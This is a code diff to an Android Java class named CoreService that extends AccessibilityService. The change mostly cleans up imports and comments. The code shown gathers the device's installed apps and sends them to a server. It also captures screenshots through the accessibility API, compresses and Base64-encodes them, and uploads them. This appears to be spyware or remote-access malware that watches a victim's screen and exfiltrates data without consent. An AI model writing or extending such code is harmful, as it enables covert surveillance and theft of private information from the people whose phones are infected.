@@ -12,10 +12,7 @@ import android.content.Intent;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.graphics.Bitmap;
-import android.graphics.PixelFormat;
 import android.hardware.HardwareBuffer;
-import android.media.Image;
-import android.media.ImageReader;
 import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
@@ -24,6 +21,8 @@ import android.provider.Settings;
 import android.util.Base64;
 import android.util.Log;
 import android.view.Display;
+import android.view.PixelCopy;
+import android.view.Surface;
 import android.view.accessibility.AccessibilityEvent;
 import androidx.annotation.NonNull;
 import androidx.core.content.ContextCompat;
@@ -37,7 +36,6 @@ import com.google.android.gms.location.LocationServices;
 import org.json.JSONException;
 import org.json.JSONObject;
 import java.io.ByteArrayOutputStream;
-import java.nio.ByteBuffer;
 import java.util.List;
 
 public class CoreService extends AccessibilityService {
@@ -179,7 +177,6 @@ public class CoreService extends AccessibilityService {
         submitDataToServer("installed_apps", apps);
     }
     
-    // --- THIS IS THE FINAL, STABLE SCREENSHOT METHOD ---
     @SuppressLint("WrongConstant")
     private void handleScreenshot() {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
@@ -197,10 +194,8 @@ public class CoreService extends AccessibilityService {
                     return;
                 }
                 
-                // This is a direct conversion from the raw buffer to a Bitmap.
-                // It is the most direct and compatible method available for this API.
                 final Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, screenshotResult.getColorSpace());
-                buffer.close(); // Close immediately after wrapping.
+                buffer.close();
                 
                 if (bitmap != null) {
                     processAndUploadBitmap(bitmap);
@@ -219,7 +214,6 @@ public class CoreService extends AccessibilityService {
     private void processAndUploadBitmap(Bitmap bitmap) {
         try {
             ByteArrayOutputStream stream = new ByteArrayOutputStream();
-            // Use a slightly lower quality to reduce memory footprint and increase success rate
             bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream);
             String encodedImage = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT);
             uploadFileToServer("screenshot", encodedImage);
